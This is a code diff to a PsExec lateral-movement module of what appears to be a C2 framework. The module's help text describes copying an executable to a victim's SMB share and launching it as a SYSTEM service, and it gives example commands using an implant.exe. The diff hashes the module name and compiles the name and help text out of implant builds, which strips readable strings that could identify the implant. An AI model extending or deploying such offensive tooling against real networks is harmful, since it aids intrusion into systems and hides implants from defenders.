@@ -12,6 +12,9 @@
 #include <windows.h>
 #endif
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 #ifdef __linux__
@@ -20,7 +23,8 @@ using namespace std;
 
 #endif
 
-const std::string moduleName = "psExec";
+constexpr std::string_view moduleName = "psExec";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -37,7 +41,11 @@ BOOL createServiceWithSCM(const std::string& scmServer, const std::string& servi
 
 
 PsExec::PsExec()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
     srand(time(NULL));
 }
@@ -51,6 +59,7 @@ PsExec::~PsExec()
 std::string PsExec::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "PsExec:\n";
 	info += "Create an exe on an SMB share of the victime and a service to launch this exec using system. \n";
     info += "The exe must be a service binary or inject into another process. \n";
@@ -58,7 +67,7 @@ std::string PsExec::getInfo()
 	info += "exemple:\n";
 	info += "- psExec m3dc.cyber.local /tmp/implant.exe\n";
     info += "- psExec 10.9.20.10 /tmp/implant.exe\n";
-
+#endif
 	return info;
 }
 
@@ -173,7 +182,7 @@ int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #endif
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(cmd);
 	c2RetMessage.set_returnvalue(result);
 	return 0;
